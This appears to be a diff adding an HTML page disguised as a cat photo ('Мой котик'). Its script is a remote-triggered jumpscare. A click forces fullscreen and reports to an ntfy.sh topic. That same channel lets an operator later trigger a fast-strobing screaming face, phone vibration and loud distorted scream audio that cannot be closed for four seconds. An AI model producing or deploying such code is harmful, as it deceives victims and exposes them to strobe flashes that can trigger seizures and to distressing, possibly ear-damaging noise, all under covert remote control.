@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="ru"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Мой котик 🐱</title>
+<style>
+:root{--bg:#f4efe6;--fg:#3a3226}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#1d1a16;--fg:#eee}}
+:root[data-theme="dark"]{--bg:#1d1a16;--fg:#eee}
+html,body{height:100%;margin:0}
+body{background:var(--bg);color:var(--fg);font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center}
+#photo{background:#fff;padding:14px 14px 44px;border-radius:6px;box-shadow:0 8px 30px rgba(0,0,0,.25);width:min(82vw,360px);cursor:zoom-in;text-align:center;color:#333}
+#photo svg{width:100%;display:block;background:#cfe3ee}
+#photo b{display:block;margin-top:12px}
+#photo small{opacity:.6}
+#scare{position:fixed;inset:0;background:#000;display:none;z-index:9}
+#scare svg{width:100%;height:100%;animation:shake .06s infinite,flash .12s infinite}
+@keyframes shake{0%{transform:translate(-14px,8px) scale(1.05)}25%{transform:translate(12px,-10px) scale(1.12)}50%{transform:translate(-8px,-12px) scale(1.06)}75%{transform:translate(14px,10px) scale(1.14)}100%{transform:translate(-12px,6px) scale(1.08)}}
+@keyframes flash{50%{filter:invert(1) contrast(1.6)}}
+#scare svg{animation:shake .05s infinite,flicker .22s infinite}
+.fa{animation:fa .2s steps(1) infinite}.fb{animation:fb .2s steps(1) infinite}
+@keyframes fa{0%{opacity:1}55%{opacity:0}}
+@keyframes fb{0%{opacity:0}55%{opacity:1}}
+@keyframes flicker{0%{filter:none}20%{filter:invert(1) contrast(2)}35%{filter:brightness(.3)}50%{filter:saturate(3) contrast(1.8)}75%{filter:brightness(1.8)}}
+</style></head><body>
+<div id="photo">
+<svg viewBox="0 0 200 200"><rect width="200" height="200" fill="#cfe3ee"/><rect y="150" width="200" height="50" fill="#9bc08a"/>
+<polygon points="50,80 62,30 92,62" fill="#e8a34a"/><polygon points="150,80 138,30 108,62" fill="#e8a34a"/>
+<ellipse cx="100" cy="150" rx="58" ry="40" fill="#f0b45f"/>
+<circle cx="100" cy="102" r="56" fill="#f0b45f"/>
+<circle cx="80" cy="95" r="8" fill="#222"/><circle cx="120" cy="95" r="8" fill="#222"/>
+<circle cx="83" cy="92" r="3" fill="#fff"/><circle cx="123" cy="92" r="3" fill="#fff"/>
+<polygon points="93,112 107,112 100,121" fill="#d9667a"/>
+<path d="M100 121 q-9 12 -19 5 M100 121 q9 12 19 5" stroke="#222" stroke-width="2.5" fill="none"/>
+<g stroke="#222" stroke-width="1.8"><path d="M68 114h-30M68 121l-28 7M132 114h30M132 121l28 7"/></g></svg>
+<b>Мой Барсик 🐱</b><small id="h">Нажми на фото, чтобы увеличить</small>
+</div>
+<div id="scare"><svg viewBox="0 0 400 400" preserveAspectRatio="xMidYMid slice">
+<defs><radialGradient id="v" cx="50%" cy="45%" r="70%"><stop offset="0" stop-color="#3a0000"/><stop offset="1" stop-color="#000"/></radialGradient>
+<radialGradient id="f" cx="50%" cy="40%" r="60%"><stop offset="0" stop-color="#e4ddd0"/><stop offset="1" stop-color="#8d8677"/></radialGradient></defs>
+<rect width="400" height="400" fill="url(#v)"/>
+<path d="M40 0 Q70 200 20 400 M360 0 Q330 200 380 400 M110 0 Q90 120 70 330 M290 0 Q310 120 330 330" stroke="#000" stroke-width="22" fill="none"/>
+<g class="fa">
+<path d="M200 12 C300 12 345 110 335 210 C328 300 280 392 200 392 C120 392 72 300 65 210 C55 110 100 12 200 12Z" fill="url(#f)" stroke="#200" stroke-width="6"/>
+<ellipse cx="135" cy="165" rx="52" ry="68" fill="#000"/><ellipse cx="265" cy="165" rx="52" ry="68" fill="#000"/>
+<circle cx="140" cy="175" r="7" fill="#fff"/><circle cx="260" cy="175" r="7" fill="#fff"/>
+<path d="M70 100 L125 140 M330 100 L275 140" stroke="#000" stroke-width="14"/>
+<path d="M193 215 L172 280 L214 272Z" fill="#4a4540"/>
+<path d="M105 285 Q200 470 295 285 Q200 330 105 285Z" fill="#000"/>
+<path d="M112 290 L122 335 L136 300 L148 352 L164 310 L178 362 L192 318 L208 362 L222 310 L236 352 L252 300 L264 335 L278 290 L260 305 L240 295 L220 315 L200 298 L180 315 L160 295 L140 305Z" fill="#eee"/>
+<path d="M150 350 v40 M200 362 v34 M250 350 v44" stroke="#a00" stroke-width="9"/>
+<path d="M180 40 l-14 70 l22 40 M240 30 l16 80 l-24 50 M100 190 l30 30" stroke="#300" stroke-width="3" fill="none"/>
+</g>
+<g class="fb">
+<path d="M200 -20 C330 -20 380 110 370 220 C362 330 290 430 200 430 C110 430 38 330 30 220 C20 110 70 -20 200 -20Z" fill="url(#f)" stroke="#400" stroke-width="8"/>
+<ellipse cx="125" cy="170" rx="70" ry="88" fill="#000"/><ellipse cx="275" cy="170" rx="70" ry="88" fill="#000"/>
+<circle cx="125" cy="185" r="14" fill="#f00"/><circle cx="275" cy="185" r="14" fill="#f00"/>
+<path d="M40 90 L120 135 M360 90 L280 135" stroke="#000" stroke-width="18"/>
+<ellipse cx="200" cy="325" rx="120" ry="95" fill="#000"/>
+<path d="M95 270 L110 340 L130 285 L148 355 L168 290 L188 365 L212 365 L232 290 L252 355 L270 285 L290 340 L305 270 L270 300 L200 285 L130 300Z" fill="#f2f2f2"/>
+<path d="M120 380 v45 M200 395 v40 M280 380 v50" stroke="#c00" stroke-width="12"/>
+</g>
+</svg></div>
+<script>
+const T='kot-4924bb271904cbab', B='https://ntfy.sh/';
+let ctx=null,cur=[],timer=null,shown=false,shownAt=0,armed=false;
+const scare=document.getElementById('scare');
+
+function curve(k){const c=new Float32Array(512);for(let i=0;i<512;i++){c[i]=Math.tanh((i/256-1)*k)}return c}
+function sound(){
+  const t=ctx.currentTime,D=3.2;
+  const out=ctx.createGain(); out.gain.value=2.6; cur.push(out);
+  const comp=ctx.createDynamicsCompressor();
+  comp.threshold.value=-50; comp.knee.value=0; comp.ratio.value=20; comp.attack.value=0.001; comp.release.value=0.06;
+  const lim=ctx.createWaveShaper(); lim.curve=curve(3);
+  out.connect(comp); comp.connect(lim); lim.connect(ctx.destination);
+  const ws=ctx.createWaveShaper(); ws.curve=curve(12); ws.connect(out);
+  // крик: несколько пилообразных голосов через формантные фильтры
+  [620,780,940,1180].forEach((f,i)=>{
+    const o=ctx.createOscillator(); o.type='sawtooth';
+    o.frequency.setValueAtTime(f*0.8,t);
+    o.frequency.linearRampToValueAtTime(f*1.6,t+0.22);
+    o.frequency.linearRampToValueAtTime(f*1.3,t+D*0.6);
+    o.frequency.linearRampToValueAtTime(f*0.7,t+D);
+    const lfo=ctx.createOscillator(), lg=ctx.createGain(); lfo.frequency.value=6+i*1.7; lg.gain.value=45+i*10;
+    lfo.connect(lg); lg.connect(o.frequency);
+    [[1100,4],[3000,6]].forEach(([fc,q])=>{
+      const bp=ctx.createBiquadFilter(); bp.type='bandpass'; bp.frequency.value=fc; bp.Q.value=q;
+      const g=ctx.createGain(); g.gain.value=2.2; o.connect(bp); bp.connect(g); g.connect(ws);
+    });
+    o.start(t); lfo.start(t); o.stop(t+D); lfo.stop(t+D);
+  });
+  // пронзительный писк
+  const sq=ctx.createOscillator(); sq.type='square';
+  sq.frequency.setValueAtTime(2400,t); sq.frequency.linearRampToValueAtTime(3900,t+D);
+  const pl=ctx.createOscillator(), pg=ctx.createGain(); pl.frequency.value=17; pg.gain.value=300;
+  pl.connect(pg); pg.connect(sq.frequency);
+  const sg=ctx.createGain(); sg.gain.value=0.35; sq.connect(sg); sg.connect(ws);
+  sq.start(t); pl.start(t); sq.stop(t+D); pl.stop(t+D);
+  // шум
+  const buf=ctx.createBuffer(1,ctx.sampleRate*D,ctx.sampleRate),d=buf.getChannelData(0);
+  for(let i=0;i<d.length;i++) d[i]=(Math.random()*2-1)*(0.7+0.3*Math.exp(-i/ctx.sampleRate*1.2));
+  const n=ctx.createBufferSource(); n.buffer=buf;
+  const hp=ctx.createBiquadFilter(); hp.type='highpass'; hp.frequency.value=1500;
+  const ng=ctx.createGain(); ng.gain.value=1.1; n.connect(hp); hp.connect(ng); ng.connect(ws); n.start(t);
+  // удар в начале
+  const im=ctx.createOscillator(); im.type='sine';
+  im.frequency.setValueAtTime(170,t); im.frequency.exponentialRampToValueAtTime(28,t+0.5);
+  const ig=ctx.createGain(); ig.gain.setValueAtTime(3,t); ig.gain.exponentialRampToValueAtTime(0.01,t+0.7);
+  im.connect(ig); ig.connect(out); im.start(t); im.stop(t+0.8);
+  // гул
+  const lo=ctx.createOscillator(); lo.type='sine'; lo.frequency.value=42;
+  const lg2=ctx.createGain(); lg2.gain.value=1.2; lo.connect(lg2); lg2.connect(out); lo.start(t); lo.stop(t+D);
+}
+function ensure(){
+  if(!ctx){try{ctx=new (window.AudioContext||window.webkitAudioContext)()}catch(e){}}
+  try{return ctx&&ctx.state!=='running'?ctx.resume():Promise.resolve()}catch(e){return Promise.resolve()}
+}
+function play(){ if(shown&&ctx&&ctx.state==='running') sound(); }
+function startSound(){ clearInterval(timer); if(!shown||!ctx||ctx.state!=='running') return; play(); timer=setInterval(play,3000); }
+function ping(m){ try{fetch(B+T+'-r',{method:'POST',body:m})}catch(e){} }
+function show(){
+  if(shown) return; shown=true; shownAt=Date.now();
+  scare.style.display='block';
+  try{navigator.vibrate&&navigator.vibrate([400,100,400,100,800,100,800])}catch(e){}
+  ensure().then(startSound).catch(()=>{});
+}
+function hide(){
+  shown=false; clearInterval(timer); timer=null;
+  cur.forEach(g=>{try{g.gain.value=0}catch(e){}}); cur=[];
+  scare.style.display='none';
+  try{document.fullscreenElement&&document.exitFullscreen()}catch(e){}
+}
+document.getElementById('photo').addEventListener('click',()=>{
+  if(!armed){ armed=true; ensure().then(()=>ping('armed')); document.getElementById('h').textContent='Загрузка…'; }
+  try{(document.documentElement.requestFullscreen||document.documentElement.webkitRequestFullscreen).call(document.documentElement)}catch(e){}
+});
+addEventListener('pointerdown',()=>{ if(shown&&!timer) ensure().then(startSound).catch(()=>{}); },{passive:true});
+scare.addEventListener('click',()=>{ if(Date.now()-shownAt>4000) hide(); });
+addEventListener('keydown',e=>{ if(e.key==='Escape') hide(); });
+function connect(){
+  const es=new EventSource(B+T+'/sse');
+  es.onopen=()=>ping('opened');
+  es.onmessage=e=>{
+    try{ const m=JSON.parse(e.data);
+      if(m.event==='message' && Math.abs(Date.now()/1000-m.time)<180){
+        if(m.message==='scare') show();
+        if(m.message==='stop') hide();
+      }
+    }catch(x){}
+  };
+}
+connect();
+</script></body></html>
